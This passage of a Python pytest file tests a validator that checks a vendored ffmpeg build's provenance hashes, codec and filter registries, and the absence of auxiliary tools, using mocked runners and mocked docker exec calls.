        "-hwaccels": "Hardware acceleration methods:",
    }

    receipt_hashes = {
        "apk_manifest": "a" * 64,
        "ffmpeg_recipe": "b" * 64,
        "glib_recipe": "c" * 64,
    }
    declared_registries = {
        "decoders": sorted(verifier.FFMPEG_ALLOWED_RUNTIME_DECODERS),
        "demuxers": sorted(verifier.FFMPEG_ALLOWED_RUNTIME_DEMUXERS),
        "encoders": sorted(verifier.FFMPEG_ALLOWED_RUNTIME_ENCODERS),
        "muxers": sorted(verifier.FFMPEG_ALLOWED_RUNTIME_MUXERS),
        "devices": [],
        "protocols": sorted(verifier.FFMPEG_REQUIRED_PROTOCOLS),
        "filters": sorted(verifier.FFMPEG_ALLOWED_RUNTIME_FILTERS),
        "parsers": sorted(verifier.FFMPEG_ALLOWED_RUNTIME_PARSERS),
        "bitstream_filters": sorted(
            verifier.FFMPEG_ALLOWED_RUNTIME_BITSTREAM_FILTERS
        ),
        "hwaccels": sorted(verifier.FFMPEG_ALLOWED_RUNTIME_HWACCELS),
    }
    payload: dict[str, object] = {
        "schema": "propertyquarry.render_media_provenance.v1",
        "version": 1,
        "ffmpeg": {
            "version": verifier.FFMPEG_EXPECTED_VERSION,
            "binary_sha256": verifier.FFMPEG_EXPECTED_BINARY_SHA256,
            "binary_size": verifier.FFMPEG_EXPECTED_BINARY_SIZE,
            "source_url": verifier.FFMPEG_EXPECTED_SOURCE_URL,
            "source_sha256": verifier.FFMPEG_EXPECTED_SOURCE_SHA256,
            "signature_url": verifier.FFMPEG_EXPECTED_SIGNATURE_URL,
            "signature_sha256": verifier.FFMPEG_EXPECTED_SIGNATURE_SHA256,
            "signing_key_url": verifier.FFMPEG_EXPECTED_SIGNING_KEY_URL,
            "signing_key_sha256": verifier.FFMPEG_EXPECTED_SIGNING_KEY_SHA256,
            "signing_fingerprint": verifier.FFMPEG_EXPECTED_SIGNING_FINGERPRINT,
            "builder_image": verifier.FFMPEG_EXPECTED_BUILDER_IMAGE,
            "x264_commit": verifier.X264_EXPECTED_COMMIT,
            "x264_archive_url": verifier.X264_EXPECTED_ARCHIVE_URL,
            "x264_archive_sha256": verifier.X264_EXPECTED_ARCHIVE_SHA256,
            "configure_enable": sorted(verifier.FFMPEG_REQUIRED_ENABLE_FLAGS),
            "configure_disable": sorted(verifier.FFMPEG_REQUIRED_DISABLE_FLAGS),
            "registries": declared_registries,
            "static": True,
            "license": verifier.FFMPEG_EXPECTED_LICENSE,
        },
        "glib": {
            "version": verifier.GLIB_EXPECTED_VERSION,
            "runtime_deb_sha256": verifier.GLIB_EXPECTED_RUNTIME_DEB_SHA256,
            "builder_image": verifier.GLIB_EXPECTED_BUILDER_IMAGE,
            "snapshot_root": verifier.GLIB_EXPECTED_SNAPSHOT_ROOT,
            **verifier.GLIB_EXPECTED_SOURCE_HASHES,
            "libmount_disabled": True,
        },
        "build_receipts": {
            name: {"path": str(path), "sha256": receipt_hashes[name]}
            for name, path in verifier.RUNTIME_BUILD_RECEIPT_PATHS.items()
        },
    }
    observed = {
        "ffmpeg_path": "/usr/local/bin/ffmpeg",
        "ffmpeg_binary_sha256": verifier.FFMPEG_EXPECTED_BINARY_SHA256,
        "ffmpeg_binary_size": verifier.FFMPEG_EXPECTED_BINARY_SIZE,
        "build_receipts": {
            name: {"path": str(path), "sha256": receipt_hashes[name]}
            for name, path in verifier.RUNTIME_BUILD_RECEIPT_PATHS.items()
        },
    }
    auxiliary_paths = {"ffplay": "", "ffprobe": ""}

    def runner(command: str, *args: str) -> dict[str, object]:
        if command in {"ffplay", "ffprobe"}:
            return {
                "available": False,
                "path": auxiliary_paths[command],
                "returncode": 127,
                "output": "",
            }
        if command == "ldd":
            return {
                "available": False,
                "path": "/usr/bin/ldd",
                "returncode": 1,
                "output": "not a dynamic executable",
            }
        if command == "/usr/local/bin/python":
            return {
                "available": True,
                "path": command,
                "returncode": 0,
                "output": json.dumps({"payload": payload, "observed": observed}),
            }
        output = registry_outputs[args[-1]]
        return {"available": True, "path": "/usr/local/bin/ffmpeg", "returncode": 0, "output": output}

    return runner, registry_outputs, payload, auxiliary_paths


def test_property_vendor_runtime_readiness_rejects_an_extra_ffmpeg_encoder() -> None:
    from ea import property_render_ffmpeg_validator as verifier

    runner, registry_outputs, _payload, _auxiliary_paths = (
        _bounded_ffmpeg_test_runner()
    )

    bounded = verifier.audit_ffmpeg_encoder(
        runner,
        require_bounded_surface=True,
    )
    assert bounded["available"] is True
    assert bounded["bounded_encoder_only"] is True
    assert all(bounded["provenance_checks"].values())

    registry_outputs["-encoders"] += "\n V..... h264 unexpected"
    expanded = verifier.audit_ffmpeg_encoder(
        runner,
        require_bounded_surface=True,
    )
    assert expanded["functional_ready"] is True
    assert expanded["bounded_encoder_only"] is False
    assert expanded["available"] is False


def test_property_vendor_runtime_readiness_rejects_unexpected_bsf_and_provenance() -> None:
    from ea import property_render_ffmpeg_validator as verifier

    runner, registry_outputs, payload, _auxiliary_paths = (
        _bounded_ffmpeg_test_runner()
    )
    registry_outputs["-bsfs"] += "\nh264_metadata"
    registry_outputs["-hwaccels"] += "\nvaapi"
    ffmpeg_payload = payload["ffmpeg"]
    assert isinstance(ffmpeg_payload, dict)
    ffmpeg_payload["source_sha256"] = "0" * 64
    declared_registries = ffmpeg_payload["registries"]
    assert isinstance(declared_registries, dict)
    declared_parsers = declared_registries["parsers"]
    assert isinstance(declared_parsers, list)
    declared_parsers.append("h264")

    capability = verifier.audit_ffmpeg_encoder(
        runner,
        require_bounded_surface=True,
    )

    assert capability["functional_ready"] is True
    assert capability["bounded_checks"]["bounded_bitstream_filter_surface"] is False
    assert capability["bounded_checks"]["hwaccels_absent"] is False
    assert capability["provenance_checks"]["ffmpeg_source_exact"] is False
    assert capability["provenance_checks"]["registry_manifest_exact"] is False
    assert capability["available"] is False


def test_property_vendor_runtime_readiness_requires_tools_to_be_absent_by_path() -> None:
    from ea import property_render_ffmpeg_validator as verifier

    runner, _registry_outputs, _payload, auxiliary_paths = (
        _bounded_ffmpeg_test_runner()
    )
    auxiliary_paths["ffprobe"] = "/usr/local/bin/ffprobe"

    capability = verifier.audit_ffmpeg_encoder(
        runner,
        require_bounded_surface=True,
    )

    assert capability["bounded_checks"]["ffprobe_absent"] is False
    assert capability["available"] is False


def test_property_vendor_container_tool_resolution_uses_runtime_shutil_which(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from ea import property_render_ffmpeg_validator as verifier

    calls: list[list[str]] = []
    monkeypatch.setattr(verifier.shutil, "which", lambda command: "/usr/bin/docker")

    def missing(
        argv: list[str],
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(argv)
        return subprocess.CompletedProcess(argv, returncode=0, stdout="\n", stderr="")

    monkeypatch.setattr(verifier.subprocess, "run", missing)

    result = verifier.capture_container_tool(
        "propertyquarry-render-tools",
        "ffprobe",
        "-version",
    )

    assert result["available"] is False
    assert result["path"] == ""
    assert result["reason"] == "command_missing"
    assert len(calls) == 1
    assert calls[0][3:8] == [
        "/usr/local/bin/python",
        "-I",
        "-c",
        calls[0][6],
        "ffprobe",
    ]
    assert "shutil.which" in calls[0][6]


def test_property_vendor_container_tool_executes_only_resolved_path(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from ea import property_render_ffmpeg_validator as verifier

    calls: list[list[str]] = []
    monkeypatch.setattr(verifier.shutil, "which", lambda command: "/usr/bin/docker")

    def resolved(
        argv: list[str],
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(argv)
        if len(calls) == 1:
            return subprocess.CompletedProcess(
                argv,
                returncode=0,
                stdout="/usr/local/bin/ffmpeg\n",
                stderr="",
            )
        return subprocess.CompletedProcess(
            argv,
            returncode=0,
            stdout="ffmpeg version 8.1.2\n",
            stderr="",
        )

    monkeypatch.setattr(verifier.subprocess, "run", resolved)

    result = verifier.capture_container_tool(
        "propertyquarry-render-tools",
        "ffmpeg",
        "-version",
    )

    assert result["available"] is True
    assert result["path"] == "/usr/local/bin/ffmpeg"
    assert calls[1] == [
        "/usr/bin/docker",
        "exec",
        "propertyquarry-render-tools",
        "/usr/local/bin/ffmpeg",
        "-version",
    ]
